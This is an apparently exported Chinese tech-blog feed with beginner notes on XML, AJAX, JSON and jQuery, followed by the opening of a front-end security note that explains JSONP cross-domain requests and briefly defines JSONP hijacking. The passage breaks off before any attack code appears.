<h5 id="XML实例"><a href="#XML实例" class="headerlink" title="XML实例"></a>XML实例</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">   xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState  == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">    myFunction(<span class="keyword">this</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhttp.open(<span class="string">"GET"</span>, <span class="string">"music_list.xml"</span>, <span class="literal">true</span>);</span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">xml</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> i;</span><br><span class="line">  <span class="keyword">var</span> xmlDoc = xml.responseXML;</span><br><span class="line">  <span class="keyword">var</span> table=<span class="string">"&lt;tr&gt;&lt;th&gt;艺术家&lt;/th&gt;&lt;th&gt;曲目&lt;/th&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">  <span class="keyword">var</span> x = xmlDoc.getElementsByTagName(<span class="string">"TRACK"</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;x.length;  i++) &#123; </span><br><span class="line">    table += <span class="string">"&lt;tr&gt;&lt;td&gt;"</span> +</span><br><span class="line">    x[i].getElementsByTagName(<span class="string">"ARTIST"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue  +</span><br><span class="line">    <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> +</span><br><span class="line">    x[i].getElementsByTagName(<span class="string">"TITLE"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue  +</span><br><span class="line">    <span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AJAX-PHP-实例"><a href="#AJAX-PHP-实例" class="headerlink" title="AJAX PHP 实例"></a>AJAX PHP 实例</h3><p>关键代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;搜索建议：&lt;spasn id=<span class="string">"txtHint"</span>&gt;&lt;<span class="regexp">/span&gt;&lt;/</span>p&gt; </span><br><span class="line"></span><br><span class="line">&lt;p&gt;姓名：&lt;insput type=<span class="string">"text"</span> id=<span class="string">"txt1"</span> onkeyup=<span class="string">"showHint(this.value)"</span>&gt;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">function showHint(str) &#123;</span></span><br><span class="line"><span class="regexp">  var xhttp;</span></span><br><span class="line"><span class="regexp">  if (str.length == 0) &#123; </span></span><br><span class="line"><span class="regexp">    document.getElementById("txtHint").innerHTML = "";</span></span><br><span class="line"><span class="regexp">    return;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  xhttp = new XMLHttpRequest();</span></span><br><span class="line"><span class="regexp">  xhttp.onreadystatechange = function() &#123;</span></span><br><span class="line"><span class="regexp">    if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span></span><br><span class="line"><span class="regexp">      document.getElementById("txtHint").innerHTML = this.responseText;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;;</span></span><br><span class="line"><span class="regexp">  xhttp.open("GET", "/</span>demo/gethint.php?q=<span class="string">"+str, true);</span></span><br><span class="line"><span class="string">  xhttp.send();   </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>php关键代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($q !== <span class="string">""</span>) &#123;</span><br><span class="line">    $q = strtolower($q);</span><br><span class="line">    $len=strlen($q);</span><br><span class="line">    foreach($a <span class="keyword">as</span> $name) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($q, substr($name, <span class="number">0</span>, $len))) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($hint === <span class="string">""</span>) &#123;</span><br><span class="line">                $hint = $name;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $hint .= <span class="string">", $name"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JSON简介"><a href="#JSON简介" class="headerlink" title="JSON简介"></a>JSON简介</h3><p><code>JSON</code> 是一种存储和交换数据的语法。当数据在浏览器与服务器之间进行交换时，这些数据只能是文本。JSON 属于文本，并且我们能够把任何 JavaScript 对象转换为 JSON，然后将 JSON 发送到服务器。我们也能把从服务器接收到的任何 JSON 转换为 JavaScript 对象。以这样的方式，我们能够把数据作为 JavaScript 对象来处理，无需复杂的解析和转译。</p>
<p><strong>实例</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//存储数据：</span></span><br><span class="line">myObj = &#123; <span class="attr">name</span>:<span class="string">"Bill Gates"</span>,  <span class="attr">age</span>:<span class="number">62</span>, <span class="attr">city</span>:<span class="string">"Seattle"</span> &#125;;</span><br><span class="line">myJSON =  <span class="built_in">JSON</span>.stringify(myObj);</span><br><span class="line">localStorage.setItem(<span class="string">"testJSON"</span>, myJSON); <span class="comment">//本地数据储存</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接收数据：</span></span><br><span class="line">text = localStorage.getItem(<span class="string">"testJSON"</span>);  <span class="comment">//本地数据取出</span></span><br><span class="line">obj =  <span class="built_in">JSON</span>.parse(text);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = obj.name;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/17/ZLpihd.png" alt="ZLpihd.png"></p>
<h3 id="JSON-文件"><a href="#JSON-文件" class="headerlink" title="JSON 文件"></a>JSON 文件</h3><ul>
<li>JSON 文件的文件类型是 “.json”</li>
<li>JSON 文本的 MIME 类型是 “application/json”</li>
</ul>
<h3 id="JSON解析"><a href="#JSON解析" class="headerlink" title="JSON解析"></a>JSON解析</h3><p>关键函数<code>parse</code>，实例如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;p id=<span class="string">"demo"</span>&gt;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">var text = '&#123;"employees":[' +</span></span><br><span class="line"><span class="regexp">'&#123;"firstName":"Bill","lastName":"Gates" &#125;,' +</span></span><br><span class="line"><span class="regexp">'&#123;"firstName":"Steve","lastName":"Jobs" &#125;,' +</span></span><br><span class="line"><span class="regexp">'&#123;"firstName":"Elon","lastName":"Musk" &#125;]&#125;';</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">obj = JSON.parse(text);</span></span><br><span class="line"><span class="regexp">document.getElementById("demo").innerHTML =</span></span><br><span class="line"><span class="regexp">obj.employees[1].firstName + " " + obj.employees[1].lastName;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JSON把JS对象字符串化"><a href="#JSON把JS对象字符串化" class="headerlink" title="JSON把JS对象字符串化"></a>JSON把JS对象字符串化</h3><p>关键函数<code>JSON.stringify()</code>，实例</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">name</span>: <span class="string">"Bill"</span>, <span class="attr">age</span>: <span class="number">62</span>, <span class="attr">city</span>: <span class="string">"Seatle"</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> myJSON = <span class="built_in">JSON</span>.stringify(obj);</span><br><span class="line"><span class="built_in">document</span>.write(myJSON);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"Bill"</span>,<span class="attr">"age"</span>:<span class="number">62</span>,<span class="attr">"city"</span>:<span class="string">"Seatle"</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>JSON.parse()</code>函数将<code>json</code>字符串转化为<code>JavaScript</code>对象，<code>JSON.stringify()</code>将<code>JavaScript</code>对象转化为<code>json</code>字符串。</p>
<h3 id="JSON与PHP"><a href="#JSON与PHP" class="headerlink" title="JSON与PHP"></a>JSON与PHP</h3><p><strong>实例</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">obj = &#123; <span class="string">"table"</span>:<span class="string">"customers"</span>, <span class="string">"limit"</span>:<span class="number">10</span> &#125;;</span><br><span class="line">dbParam = <span class="built_in">JSON</span>.stringify(obj);</span><br><span class="line">xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">         myObj = <span class="built_in">JSON</span>.parse(<span class="keyword">this</span>.responseText);</span><br><span class="line">         <span class="keyword">for</span> (x <span class="keyword">in</span> myObj) &#123;</span><br><span class="line">             txt += myObj[x].name + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = txt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"demo_json_db.php"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"x="</span> + dbParam);</span><br></pre></td></tr></table></figure>

<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>这里只是简单的介绍一下JSONP，后续文章会有详细的描述。</p>
<blockquote>
<p>Jsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p>
<p>为什么我们从不同的域（网站）访问数据需要一个特殊的技术( JSONP )呢？这是因为同源策略。</p>
<p>同源策略，它是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;demo_jsonp.php&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JQuery介绍"><a href="#JQuery介绍" class="headerlink" title="JQuery介绍"></a>JQuery介绍</h3><p><strong>jQuery</strong>是一套跨<a href="https://jsproxy.ga/-----https://zh.wikipedia.org/wiki/瀏覽器" target="_blank" rel="noopener">浏览器</a>的<a href="https://jsproxy.ga/-----https://zh.wikipedia.org/wiki/JavaScript" target="_blank" rel="noopener">JavaScript</a><a href="https://jsproxy.ga/-----https://zh.wikipedia.org/wiki/函式庫" target="_blank" rel="noopener">函式库</a>，简化<a href="https://jsproxy.ga/-----https://zh.wikipedia.org/wiki/HTML" target="_blank" rel="noopener">HTML</a>与JavaScript之间的操作。</p>
<p><img src="https://s2.ax1x.com/2019/07/18/ZO7nkq.png" alt="ZO7nkq.png"></p>
<p>可以比较方便的通过CDN引用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;1.10.2&#x2F;jquery.min.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JQuery语法"><a href="#JQuery语法" class="headerlink" title="JQuery语法"></a>JQuery语法</h3><h4 id="JQuery选择器"><a href="#JQuery选择器" class="headerlink" title="JQuery选择器"></a>JQuery选择器</h4><p><img src="https://s2.ax1x.com/2019/07/18/ZOHXdA.png" alt="ZOHXdA.png"></p>
<p>JQuery选择器简化了javascipt对元素的选择调用，在正常的js语句调用一个id为1的元素，调用语句为<code>getElementById(&#39;1&#39;)</code>,而在JQuery的调用中只需要<code>$(&quot;#1&quot;)</code>即可完成。实例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$(<span class="string">".test"</span>).hide();</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>代码解读：$(document)代表选择的是整个文档，ready代表的是一个事件，也就是当整个文档都加载完毕了再执行下面的JQuery操作，$(“button”)代表选择了button按钮，并且再触发click事件时调用function去隐藏所有class为test的元素。常见选择器如下:</p>
<p><img src="https://s2.ax1x.com/2019/07/18/ZObBeH.png" alt="ZObBeH.png"></p>
<h4 id="JQuery事件"><a href="#JQuery事件" class="headerlink" title="JQuery事件"></a>JQuery事件</h4><p>实例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"input"</span>).focus(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="keyword">this</span>).css(<span class="string">"background-color"</span>,<span class="string">"#cccccc"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>当获得焦点时，选择当前html元素并改变css样式。</p>
<h4 id="JQuery-Callback"><a href="#JQuery-Callback" class="headerlink" title="JQuery Callback"></a>JQuery Callback</h4><p>实例</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"p"</span>).hide(<span class="string">"slow"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		alert(<span class="string">"段落现在被隐藏了"</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>callback函数在隐藏效果完全实现后进行调用。</p>
<h4 id="JQuery获取内容"><a href="#JQuery获取内容" class="headerlink" title="JQuery获取内容"></a>JQuery获取内容</h4><p>三个简单实用的用于 DOM 操作的 jQuery 方法：</p>
<ul>
<li>text() - 设置或返回所选元素的文本内容</li>
<li>html() - 设置或返回所选元素的内容（包括 HTML 标记）</li>
<li>val() - 设置或返回表单字段的值</li>
</ul>
<p>实例</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $(<span class="string">"#btn1"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">"Text: "</span> + $(<span class="string">"#test"</span>).text());</span><br><span class="line">  &#125;);</span><br><span class="line">  $(<span class="string">"#btn2"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">"HTML: "</span> + $(<span class="string">"#test"</span>).html());  <span class="comment">//设置内容直接在html()中添加，例如 html('lihuaiqiu')</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="JQuery获取属性"><a href="#JQuery获取属性" class="headerlink" title="JQuery获取属性"></a>JQuery获取属性</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $(<span class="string">"button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert($(<span class="string">"#runoob"</span>).attr(<span class="string">"href"</span>)); <span class="comment">//同样可设置属性 attr("href","xxx")</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="JQuery添加-删除元素"><a href="#JQuery添加-删除元素" class="headerlink" title="JQuery添加/删除元素"></a>JQuery添加/删除元素</h4><ul>
<li>append() - 在被选元素的结尾插入内容</li>
<li>prepend() - 在被选元素的开头插入内容</li>
<li>after() - 在被选元素之后插入内容</li>
<li>before() - 在被选元素之前插入内容</li>
<li>remove() - 删除被选元素（及其子元素）</li>
<li>empty() - 从被选元素中删除子元素</li>
</ul>
<h4 id="JQuery操作css"><a href="#JQuery操作css" class="headerlink" title="JQuery操作css"></a>JQuery操作css</h4><ul>
<li>addClass() - 向被选元素添加一个或多个类</li>
<li>removeClass() - 从被选元素删除一个或多个类</li>
<li>toggleClass() - 对被选元素进行添加/删除类的切换操作</li>
<li>css() - 设置或返回样式属性</li>
</ul>
<h4 id="JQuery遍历"><a href="#JQuery遍历" class="headerlink" title="JQuery遍历"></a>JQuery遍历</h4><p><a href="https://www.runoob.com/jquery/jquery-traversing.html" target="_blank" rel="noopener">https://www.runoob.com/jquery/jquery-traversing.html</a></p>
<h4 id="JQuery与Ajax"><a href="#JQuery与Ajax" class="headerlink" title="JQuery与Ajax"></a>JQuery与Ajax</h4><p><strong>load方法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(selector).load(URL,data,callback);</span><br></pre></td></tr></table></figure>

<p>必需的 <em>URL</em> 参数规定您希望加载的 URL。</p>
<p>可选的 <em>data</em> 参数规定与请求一同发送的查询字符串键/值对集合。</p>
<p>可选的 <em>callback</em> 参数是 load() 方法完成后所执行的函数名称。</p>
<p>实例</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"#div1"</span>).load(<span class="string">"demo_test.txt"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">responseTxt,statusTxt,xhr</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(statusTxt==<span class="string">"success"</span>)</span><br><span class="line">		alert(<span class="string">"外部内容加载成功!"</span>);</span><br><span class="line">	<span class="keyword">if</span>(statusTxt==<span class="string">"error"</span>)</span><br><span class="line">		alert(<span class="string">"Error: "</span>+xhr.status+<span class="string">": "</span>+xhr.statusText);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>function即为所选的回调函数。</p>
<ul>
<li><em>responseTxt</em> - 包含调用成功时的结果内容</li>
<li><em>statusTXT</em> - 包含调用的状态</li>
<li><em>xhr</em> - 包含 XMLHttpRequest 对象</li>
</ul>
<p><strong>GET方法</strong></p>
<p>实例</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = $(<span class="string">"#name"</span>).val();</span><br><span class="line">    $.<span class="keyword">get</span>("xxx.php", &#123;</span><br><span class="line">    	<span class="string">"act"</span>: name</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">data, status</span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (status) &#123;alert(data);&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>data为返回的数据，status为状态。其实大多数都是去用规定的函数去处理返回的JSON数据，毕竟JSON+xml才是最常见的数据传输方式。JQuery同样有处理JSON的方法，实例如下</p>
<p><img src="https://s2.ax1x.com/2019/07/18/ZXGiwV.png" alt="ZXGiwV.png"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.getJSON(<span class="string">"xxx.php"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data, status</span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (status)&#123;</span><br><span class="line">    		$(<span class="string">"div"</span>).html(data.name + <span class="string">' | '</span> + data.url + <span class="string">' | '</span> + data.PR);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以对象的形式来调用返回的JSON值。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.runoob.com/" target="_blank" rel="noopener">https://www.runoob.com</a></p>
<p><a href="https://www.leavesongs.com/HTML/begin-jquery-ajax.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/begin-jquery-ajax.html</a></p>
<p><a href="http://www.w3school.com.cn/" target="_blank" rel="noopener">http://www.w3school.com.cn/</a></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全学习笔记(三)-JSONP劫持</title>
    <url>/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89-JSONP%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在了解JSONP劫持前，首先了解以下JSONP跨域(因为上一篇文章讲的比较略)</p>
<h3 id="JSONP跨域"><a href="#JSONP跨域" class="headerlink" title="JSONP跨域"></a>JSONP跨域</h3><p>跨域的一些问题在上一篇文章中已经讲的比较清楚了，这里还是主要介绍JSONP，JSONP跨域巧妙的利用了script标签能跨域的特点,实现了json的跨域传输。</p>
<h4 id="JSONP原型理解"><a href="#JSONP原型理解" class="headerlink" title="JSONP原型理解"></a>JSONP原型理解</h4><p>test.html</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="comment">//回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    alert(data.message);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">" src="</span>http:<span class="comment">//120.77.174.89:10080/test.js"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>test.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">callback(&#123;message:&quot;success&quot;&#125;);</span><br></pre></td></tr></table></figure>

<p>访问test.html</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvOsPJ.png" alt="ZvOsPJ.png"></p>
<p><strong>上述形式也就是JSONP的原型，通过调用回调函数来返回所需要的数据。将JSON数据填充进回调函数，也就是JSONP—–JSON+Padding。</strong></p>
<p>来看一下比较官方的JSONP跨域代码—–Google的Ajax搜索方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="comment">//添加&lt;script&gt;标签的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addScriptTag</span>(<span class="params">src</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.setAttribute(<span class="string">"type"</span>,<span class="string">"text/javascript"</span>);</span><br><span class="line">        script.src = src;</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//搜索apple，将自定义的回调函数名result传入callback参数中</span></span><br><span class="line">    addScriptTag(<span class="string">"http://ajax.googleapis.com/ajax/services/search/web?v=1.0&amp;q=apple&amp;callback=result"</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自定义的回调函数result</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">result</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//我们就简单的获取apple搜索结果的第一条记录中url数据</span></span><br><span class="line">    alert(data.responseData.results[<span class="number">0</span>].unescapedUrl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>也是同样的逻辑，利用回调函数调用result函数将数据取出，这里<strong>重点解释一下<code>window.onload</code>的作用，在<code>function addScriptTag</code>中的最后一段代码<code>document.body.appendChild(script)</code>，这个<code>script</code>标签是要放到body中的，而我们的js代码是在head中的，此时body还没有初始化完毕，所以需要window.onload先进行初始化页面,当页面一初始化完毕，立刻执行此函数方法。</strong></p>
<p>一些JSONP服务接口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Digg API：来自 Digg 的头条新闻：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//services.digg.com/stories/top?appkey=http%3A%2F%2Fmashup.com&amp;type=javascript&amp;callback=?</span></span><br><span class="line"></span><br><span class="line">Geonames API：邮编的位置信息：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//www.geonames.org/postalCodeLookupJSON?postalcode=10504&amp;country=US&amp;callback=?</span></span><br><span class="line"></span><br><span class="line">Flickr JSONP API：载入最新猫的图片：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//api.flickr.com/services/feeds/photos_public.gne?tags=cat&amp;tagmode=any&amp;format=json&amp;jsoncallback=?</span></span><br><span class="line"></span><br><span class="line">Yahoo Local Search API：在邮编为 <span class="number">10504</span> 的地区搜索比萨：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//local.yahooapis.com/LocalSearchService/V3/localSearch?appid=YahooDemo&amp;query=pizza&amp;zip=10504&amp;results=2&amp;output=json&amp;callback=</span></span><br></pre></td></tr></table></figure>

<h4 id="jQuery的jsonp实现"><a href="#jQuery的jsonp实现" class="headerlink" title="jQuery的jsonp实现"></a>jQuery的jsonp实现</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;  </span></span><br><span class="line"><span class="regexp">$.getJSON("http:/</span><span class="regexp">/xxx/</span>xxx?callback=?<span class="string">",function(data)&#123;        </span></span><br><span class="line"><span class="string">		alert(data.name + "</span> is a a<span class="string">" + data.sex);    </span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>url后面必须要添加一个callback参数，这样getJSON方法才会知道是用JSONP方式去访问服务，callback后面的那个问号是内部自动生成的一个回调函数名。类似这个形式<code>jQuery32108394227022163139_1498134481374</code></p>
<p>如果想要自己规定函数名字，可以用以下形式的JSONP调用，实例如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">            type: <span class="string">"get"</span>,</span><br><span class="line">            url: <span class="string">"http://localhost/xxx/ProcessCallback"</span>, <span class="comment">// 这个就是不同于当前域的一个URL地址，这里单纯演示，所以同域</span></span><br><span class="line">            dataType: <span class="string">"jsonp"</span>,</span><br><span class="line">            jsonp: <span class="string">"jsonpcallback"</span>,  <span class="comment">// 指定回调函数，这里名字可以为其他任意你喜欢的，比如callback，不过必须与下一行的GET参数一致</span></span><br><span class="line">            data: <span class="string">"name=jxq&amp;email=feichexia@yahoo.com.cn&amp;jsonpcallback=?"</span>, <span class="comment">// jsonpcallback与上面的jsonp值一致</span></span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">json</span>) </span>&#123;</span><br><span class="line">                alert(json.Name);</span><br><span class="line">                alert(json.Email);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">)&#125;;</span><br></pre></td></tr></table></figure>

<p>这样就可以指定自己想要的回调函数名字了。</p>
<h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>在上文中已经比较详细的说明了JSONP跨域了，那么下面就来说一下JSONP劫持了，先来一个官方定义</p>
<p>JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。一个典型的 JSON Hijacking 攻击代码：</p>
